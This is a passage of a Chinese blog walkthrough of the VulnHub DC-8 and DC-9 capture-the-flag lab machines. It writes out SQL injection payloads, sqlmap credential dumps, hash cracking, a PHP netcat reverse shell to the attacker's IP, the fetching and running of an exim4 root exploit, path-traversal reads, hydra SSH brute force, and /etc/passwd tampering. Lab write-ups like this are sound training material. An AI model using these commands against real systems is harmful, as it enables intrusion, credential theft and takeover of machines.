Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I&#39;m sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><h3 id="参考文章-5"><a href="#参考文章-5" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.anquanke.com/post/id/187876#h3-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187876#h3-3</a></p>
<h2 id="DC8"><a href="#DC8" class="headerlink" title="DC8"></a>DC8</h2><h3 id="基本环境搭建-3"><a href="#基本环境搭建-3" class="headerlink" title="基本环境搭建"></a>基本环境搭建</h3><p>靶机下载地址:<a href="https://download.vulnhub.com/dc/DC-8.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-8.zip</a></p>
<h3 id="基本信息收集-6"><a href="#基本信息收集-6" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><pre><code>Nmap scan report for 192.168.124.152
Host is up (0.00058s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)
|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)
|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)
80/tcp open  http    Apache httpd
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache
|_http-title: Welcome to DC-8 | DC-8
MAC Address: 00:0C:29:AE:A9:C3 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms 192.168.124.152</code></pre><p>查看发现了80，22端口，操作系统linux<br>进一步扫描,没发现其他端口</p>
<pre><code>nmap 192.168.124.152 -p 1-65535</code></pre><p>爆破ssh,无结果</p>
<pre><code>nmap --script=ssh-brute 192.168.124.152</code></pre><p>查看80端，cms Drupal 7<br><img src="/images/pasted-269.png" alt="upload successful"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>msf上的基本漏洞利用没效果，这里发现id尝试一下sql注入吧<br><img src="/images/pasted-270.png" alt="upload successful"><br>先尝试简单的报错注入吧，没有任何防护直接注入<br>sqlmap一把梭哈<br><img src="/images/pasted-271.png" alt="upload successful"></p>
<pre><code>http://192.168.124.152/?nid=1%20and%20updatexml(1,concat(0x7e,database()),1)#

sqlmap -u http://192.168.124.152/?nid=1 -D d7db -T users --dump</code></pre><p>成功报出，账号密码的hash值<br><img src="/images/pasted-272.png" alt="upload successful"></p>
<pre><code>05:16:06] [INFO] resumed: &#39;admin&#39;
[05:16:06] [INFO] resumed: &#39;1567489015&#39;
[05:16:06] [INFO] resumed: &#39;dc8blah@dc8blah.org&#39;
[05:16:06] [INFO] resumed: &#39;1567766626&#39;
[05:16:06] [INFO] resumed: &#39;dcau-user@outlook.com&#39;
[05:16:06] [INFO] resumed: &#39;$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z&#39;
[05:16:06] [INFO] resumed: &#39;0&#39;
[05:16:06] [INFO] resumed: &#39;&#39;
[05:16:06] [INFO] resumed: &#39;filtered_html&#39;
[05:16:06] [INFO] resumed: &#39;1&#39;
[05:16:06] [INFO] resumed: &#39;&#39;
[05:16:06] [INFO] resumed: &#39;Australia/Brisbane&#39;
[05:16:06] [INFO] resumed: &#39;1&#39;
[05:16:06] [INFO] resumed: &#39;1567498512&#39;
[05:16:06] [INFO] resumed: &#39;a:5:{s:16:&quot;ckeditor_default&quot;;s:1:&quot;t&quot;;s:20:&quot;ckeditor_show_toggle&quot;;s:1:&quot;t&quot;;s:14:&quot;ckeditor_width&quot;;s:4:...
[05:16:06] [INFO] resumed: &#39;&#39;
[05:16:06] [INFO] resumed: &#39;john&#39;
[05:16:06] [INFO] resumed: &#39;1567489250&#39;
[05:16:06] [INFO] resumed: &#39;john@blahsdfsfd.org&#39;
[05:16:06] [INFO] resumed: &#39;1567497783&#39;
[05:16:06] [INFO] resumed: &#39;john@blahsdfsfd.org&#39;
[05:16:06] [INFO] resumed: &#39;$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF&#39;
[05:16:06] [INFO] resumed: &#39;0&#39;
[05:16:06] [INFO] resumed: &#39;&#39;</code></pre><p>爆破一下hash值,使用john这里提示了<br>爆破成功了john的密码turtle</p>
<pre><code>C:\root\Desktop&gt; john pass.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])
No password hashes left to crack (see FAQ)
C:\root\Desktop&gt; john --show pass.txt
john:turtle

1 password hash cracked, 0 left</code></pre><p>扫描一下目录</p>
<pre><code>dirb http://192.168.124.152</code></pre><p>发现user目录是登录的地方</p>
<p>登录成功,发现这个位置可以添加php代码，直接尝试反弹shell</p>
<pre><code>http://192.168.124.152/node/3#overlay=node/3/webform/configure</code></pre><pre><code>&lt;p&gt;flag&lt;/p&gt;
&lt;?php
system(&quot;nc -e /bin/sh 192.168.124.139  4444&quot;);
?&gt;</code></pre><p>然后这个页面随便输出什么点击提交等待反弹的shell<br><img src="/images/pasted-273.png" alt="upload successful"><br>然后反弹交互shell</p>
<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><h3 id="提权-3"><a href="#提权-3" class="headerlink" title="提权"></a>提权</h3><p>先尝试suid提权</p>
<pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><pre><code>www-data@dc-8:/var/www/html$ find / -perm -u=s -type f 2&gt;/dev/null
find / -perm -u=s -type f 2&gt;/dev/null
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ping
/bin/su
/bin/umount
/bin/mount</code></pre><p><img src="/images/pasted-274.png" alt="upload successful"><br>发现一个特别的exim4搜索一下漏洞<br>尝试一下这个漏洞<br><img src="/images/pasted-275.png" alt="upload successful"><br>先复制出来</p>
<pre><code>cp /usr/share/exploitdb/exploits/linux/local/46996.sh 46996.sh</code></pre><p>处理为unix可以的</p>
<p><img src="/images/pasted-278.png" alt="upload successful"><br><img src="/images/pasted-277.png" alt="upload successful"><br>开启一个服务或者你蚁剑连接上传</p>
<pre><code>python -m SimpleHTTPServer</code></pre><p>然后下载下来</p>
<pre><code>wget http://192.168.124.139:8000/46996.sh</code></pre><p>里面有使用说明<br><img src="/images/pasted-276.png" alt="upload successful"></p>
<pre><code>chmod 777 46996.sh
./46996.sh -m netcat</code></pre><p><img src="/images/pasted-279.png" alt="upload successful"></p>
<pre><code>Brilliant - you have succeeded!!!



888       888          888 888      8888888b.                             888 888 888 888
888   o   888          888 888      888  &quot;Y88b                            888 888 888 888
888  d8b  888          888 888      888    888                            888 888 888 888
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;
888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888



Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I&#39;m also sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

This challenge was largely based on two things:

1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.
2. A suggestion from @theart42

The answer to that question is...

If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><h3 id="参考文章-6"><a href="#参考文章-6" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/weixin_43583637/article/details/102828013" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43583637/article/details/102828013</a><br><a href="https://fan497.top/2020/11/17/vulnhub-DC8/" target="_blank" rel="noopener">https://fan497.top/2020/11/17/vulnhub-DC8/</a></p>
<h2 id="DC9"><a href="#DC9" class="headerlink" title="DC9"></a>DC9</h2><h3 id="基本环境搭建-4"><a href="#基本环境搭建-4" class="headerlink" title="基本环境搭建"></a>基本环境搭建</h3><p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-9.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-9.zip</a></p>
<h3 id="基本信息收集-7"><a href="#基本信息收集-7" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><pre><code>nmap -sS -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.153
Host is up (0.00041s latency).
Not shown: 998 closed ports
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
MAC Address: 00:0C:29:20:FE:11 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.124.153</code></pre><p>开放了80，22ssh，操作系统linux</p>
<p>端口的进一步扫描(没发现新的端口)</p>
<pre><code>nmap 192.168.124.153 -p 1-65535</code></pre><p>爆破一下ssh</p>
<pre><code>nmap --script=ssh-brute 192.168.124.153</code></pre><p>查看80端口，说让我们看看你其他目录</p>
<p><img src="/images/pasted-280.png" alt="upload successful"><br>测试了一下manage功能似乎没有啥问题，再search的地方发现了sql注入<br><img src="/images/pasted-281.png" alt="upload successful"><br>sqlmap直接跑一下,跑出三个数据库</p>
<pre><code>sqlmap -u &quot;http://192.168.124.153/results.php&quot; --data &quot;search=&quot; --dbs</code></pre><p><img src="/images/pasted-282.png" alt="upload successful"><br>继续跑表</p>
<h4 id="users的"><a href="#users的" class="headerlink" title="users的"></a>users的</h4><pre><code>sqlmap -u &quot;http://192.168.124.153/results.php&quot; --data &quot;search=&quot; -D users --tables</code></pre><p><img src="/images/pasted-283.png" alt="upload successful"></p>
<pre><code>sqlmap -u &quot;http://192.168.124.153/results.php&quot; --data &quot;search=&quot; -D users -T UserDetails --dump</code></pre><pre><code>+------+------------+---------------------+-----------+-----------+---------------+
| id   | lastname   | reg_date            | username  | firstname | password      |
+------+------------+---------------------+-----------+-----------+---------------+
| 17   | Morrison   | 2019-12-29 16:58:28 | janitor2  | Scott     | Hawaii-Five-0 |
| 16   | Trump      | 2019-12-29 16:58:26 | janitor   | Donald    | Ilovepeepee   |
| 15   | McScoots   | 2019-12-29 16:58:26 | scoots    | Scooter   | YR3BVxxxw87   |
| 14   | Buffay     | 2019-12-29 16:58:26 | phoebeb   | Phoebe    | smellycats    |
| 13   | Geller     | 2019-12-29 16:58:26 | monicag   | Monica    | 3248dsds7s    |
| 12   | Geller     | 2019-12-29 16:58:26 | rossg     | Ross      | ILoveRachel   |
| 11   | Green      | 2019-12-29 16:58:26 | rachelg   | Rachel    | yN72#dsd      |
| 10   | Tribbiani  | 2019-12-29 16:58:26 | joeyt     | Joey      | Passw0rd      |
| 9    | Bing       | 2019-12-29 16:58:26 | chandlerb | Chandler  | UrAG0D!       |
| 8    | Rubble     | 2019-12-29 16:58:26 | bettyr    | Betty     | BamBam01      |
| 7    | Flintstone | 2019-12-29 16:58:26 | wilmaf    | Wilma     | Pebbles       |
| 6    | Mouse      | 2019-12-29 16:58:26 | jerrym    | Jerry     | B8m#48sd      |
| 5    | Cat        | 2019-12-29 16:58:26 | tomc      | Tom       | TC&amp;TheBoyz    |
| 4    | Rubble     | 2019-12-29 16:58:26 | barneyr   | Barney    | RocksOff      |
| 3    | Flintstone | 2019-12-29 16:58:26 | fredf     | Fred      | 4sfd87sfd1    |
| 2    | Dooley     | 2019-12-29 16:58:26 | julied    | Julie     | 468sfdfsd2    |
| 1    | Moe        | 2019-12-29 16:58:26 | marym     | Mary      | 3kfs86sfd     </code></pre><p><img src="/images/pasted-284.png" alt="upload successful"></p>
<h4 id="Staff的"><a href="#Staff的" class="headerlink" title="Staff的"></a>Staff的</h4><pre><code>sqlmap -u &quot;http://192.168.124.153/results.php&quot; --data &quot;search=&quot; -D Staff --tables</code></pre><p>报出了俩表</p>
<pre><code>Database: Staff
[2 tables]
+--------------+
| StaffDetails |
| Users        |
+--------------+</code></pre><pre><code>sqlmap -u &quot;http://192.168.124.153/results.php&quot; --data &quot;search=&quot; -D Staff -T Users --dump</code></pre><p>Users的表</p>
<pre><code>Database: Staff
Table: Users
[1 entry]
+--------+----------+----------------------------------+
| UserID | Username | Password                         |
+--------+----------+----------------------------------+
| 1      | admin    | 856f5de590ef37314e7c3bdf6f8a66dc |
+--------+----------+----------------------------------+</code></pre><p>StaffDetails的表</p>
<pre><code>sqlmap -u &quot;http://192.168.124.153/results.php&quot; --data &quot;search=&quot; -D Staff -T StaffDetails --dump</code></pre><pre><code>Database: Staff
Table: StaffDetails
[17 entries]
+------+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| id   | email                 | phone          | lastname   | reg_date            | firstname | position                      |
+------+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| 2    | julied@example.com    | 46457131654    | Dooley     | 2019-05-01 17:32:00 | Julie     | Human Resources               |
| 17   | janitor2@example.com  | 47836546413    | Morrison   | 2019-12-24 03:41:04 | Scott     | Assistant Replacement Janitor |
| 15   | scoots@example.com    | 454786464      | McScoots   | 2019-05-01 20:16:33 | Scooter   | Resident Cat                  |
| 13   | monicag@example.com   | 8092432798     | Geller     | 2019-05-01 17:32:00 | Monica    | Marketing                     |
| 11   | rachelg@example.com   | 823897243978   | Green      | 2019-05-01 17:32:00 | Rachel    | Personal Assistant            |
| 9    | chandlerb@example.com | 189024789      | Bing       | 2019-05-01 17:32:00 | Chandler  | President - Sales             |
| 7    | wilmaf@example.com    | 243457487      | Flintstone | 2019-05-01 17:32:00 | Wilma     | Accounts                      |
| 5    | tomc@example.com      | 802438797      | Cat        | 2019-05-01 17:32:00 | Tom       | Driver                        |
| 3    | fredf@example.com     | 46415323       | Flintstone | 2019-05-01 17:32:00 | Fred      | Systems Administrator         |
| 1    | marym@example.com     | 46478415155456 | Moe        | 2019-05-01 17:32:00 | Mary      | CEO                           |
| 16   | janitor@example.com   | 65464646479741 | Trump      | 2019-12-23 03:11:39 | Donald    | Replacement Janitor           |
| 14   | phoebeb@example.com   | 43289079824    | Buffay     | 2019-05-01 17:32:02 | Phoebe    | Assistant Janitor             |
| 12   | rossg@example.com     | 6549638203     | Geller     | 2019-05-01 17:32:00 | Ross      | Instructor                    |
| 10   | joeyt@example.com     | 232131654      | Tribbiani  | 2019-05-01 17:32:00 | Joey      | Janitor                       |
| 8    | bettyr@example.com    | 90239724378    | Rubble     | 2019-05-01 17:32:00 | Betty     | Junior Accounts               |
| 6    | jerrym@example.com    | 24342654756    | Mouse      | 2019-05-01 17:32:00 | Jerry     | Stores                        |
| 4    | barneyr@example.com   | 324643564      | Rubble     | 2019-05-01 17:32:00 | Barney    | Help Desk                     |
+------+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+</code></pre><p>MD5解码一下password的密码</p>
<pre><code>856f5de590ef37314e7c3bdf6f8a66dc</code></pre><p><img src="/images/pasted-285.png" alt="upload successful"><br>密码</p>
<pre><code>transorbital1</code></pre><p>尝试登录,登录成功，发现这里提示File does not exist，估计是包含了某个文件，尝试文件包含,发现确实存在文件包含<br><img src="/images/pasted-286.png" alt="upload successful"><br><img src="/images/pasted-287.png" alt="upload successful"><br>然后看来大佬的wp，发现一个没了解的地方</p>
<pre><code>http://192.168.124.153/welcome.php?file=../../../../../../../../../etc/knockd.conf</code></pre><p><img src="/images/pasted-288.png" alt="upload successful"><br><img src="/images/pasted-289.png" alt="upload successful"><br>也就是说黑客进行直接扫描端口扫描不出来，只有进行固定knockd的访问才能打开<br>查看配置文件发现需要连续访问的端口</p>
<pre><code>[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn </code></pre><p>轮流敲</p>
<pre><code>nmap 192.168.124.153 -p 7469
nmap 192.168.124.153 -p 8475
nmap 192.168.124.153 -p 9842</code></pre><p><img src="/images/pasted-290.png" alt="upload successful"><br>将之前爆破的users的账号密码，提权出来进行ssh的爆破</p>
<pre><code>cat UserDetails.csv | awk -F &#39;,&#39; &#39;{print $4}&#39; &gt; username.txt</code></pre><p><img src="/images/pasted-291.png" alt="upload successful"></p>
<pre><code>cat UserDetails.csv | awk -F &#39;,&#39; &#39;{print $NF}&#39; &gt; password.txt</code></pre><p><img src="/images/pasted-292.png" alt="upload successful"></p>
<h4 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h4><p>hydra破解进行破解</p>
<pre><code>hydra -L username.txt -P password.txt 192.168.124.153 ssh</code></pre><p>成功爆破出三个用户<br><img src="/images/pasted-293.png" alt="upload successful"><br>登录janitor发现了隐藏文件<br><img src="/images/pasted-294.png" alt="upload successful"><br>将其加入到password中再次进行爆破<br>成功多爆破出一个账号密码尝试登录</p>
<p><img src="/images/pasted-295.png" alt="upload successful"><br>看一下权限</p>
<pre><code>sudo -l</code></pre><p><img src="/images/pasted-296.png" alt="upload successful"><br>发现一个test文件<br><img src="/images/pasted-297.png" alt="upload successful"><br>执行了一下发现执行不了<br>再上一层目录发现了源码<br>代码的意思是将第一个文件的内容写入第二个文件中<br>所以我们可以创建一个文件写入root权限的信息，然后用test将其写入到/etc/passwd中</p>
<pre><code>echo &quot;admin:*:0:0:::/bin/bash&quot; &gt;&gt; /tmp/passwd</code></pre><p><img src="/images/pasted-298.png" alt="upload successful"><br>然后利用test将/tmp/passwd的内容写入到/etc/passwd中</p>
<pre><code>sudo ./test /tmp/passwd /etc/passwd</code></pre><pre><code>fredf@dc-9:/opt/devstuff/dist/test$ su admin
root@dc-9:/opt/devstuff/dist/test# whoami
root
root@dc-9:~# ls
theflag.txt
root@dc-9:~# cat theflag.txt 


███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝

Congratulations - you have done well to get to this point.

Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
who have taken the time to complete the various DC challenges.

I also want to send out a big thank you to the various members of @m0tl3ycr3w .

They are an inspirational bunch of fellows.

Sure, they might smell a bit, but...just kidding.  :-)

Sadly, all things must come to an end, and this will be the last ever
challenge in the DC series.

So long, and thanks for all the fish.</code></pre><h3 id="参考文章-7"><a href="#参考文章-7" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/yurang/p/13709536.html" target="_blank" rel="noopener">https://www.cnblogs.com/yurang/p/13709536.html</a></p>

            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://lnng.top" rel="external nofollow noreferrer">Lmg</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://lnng.top/posts/2ea3.html">https://lnng.top/posts/2ea3.html</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://lnng.top" target="_blank">Lmg</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E9%9D%B6%E5%9C%BA/">
                                    <span class="chip bg-color">靶场</span>
                                </a>
                            
                                <a href="/tags/DC/">
                                    <span class="chip bg-color">DC</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/share/css/share.min.css">

<div id="article-share">
    
    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    
    <div class="livere-card card" data-aos="fade-up">
    <!-- 来必力City版安装代码 -->
    <div id="lv-container" class="card-content" data-id="city" data-uid="MTAyMC80OTIwMS8yNTY5NQ==">
        <script type="text/javascript">
            (function (d, s) {
                let j, e = d.getElementsByTagName(s)[0];
                if (typeof LivereTower === 'function') {
                    return;
                }

                j = d.createElement(s);
                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
                j.async = true;

                e.parentNode.insertBefore(j, e);
            })(document, 'script');
        </script>
        <noscript>为正常使用来必力评论功能请激活JavaScript。</noscript>
    </div>
    <!-- City版安装代码已完成 -->
</div>
    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/posts/68bd.html">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/featureimages/8.jpg" class="responsive-img" alt="vulhub">
                        
                        <span class="card-title">vulhub</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            靶场说明靶场地址:https://github.com/vulhub/vulhub
靶场是基于docker搭建的，用起来真心舒服，强烈推荐，搭建方便而且还有题解，下面就是一些自己的复现，没啥东西就是cv的，就是简单记录一下学习
AppWeb
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2020-12-20
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
                                    web安全
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E9%9D%B6%E5%9C%BA/">
                        <span class="chip bg-color">靶场</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/posts/8e46.html">
                    <div class="card-image">
                        
                        <img src="https://Lmg66.github.io/images/pasted-235.png" class="responsive-img" alt="蚁剑原理与魔改">
                        
                        <span class="card-title">蚁剑原理与魔改</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            一句话木马原理一句话木马形如这样：
&lt;?php @eval($_POST[password]);?&gt;使用蚁剑连接，连接成功那为什么能成功呢？首先要探寻一句话木马的原理所以我们post传入的字符串会以php代码的形式运行，而php
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-21
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
                                    web安全
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E8%9A%81%E5%89%91%E6%94%B9%E9%80%A0/">
                        <span class="chip bg-color">蚁剑改造</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: Script kiddie&#39;s life<br />'
            + '文章作者: Lmg<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
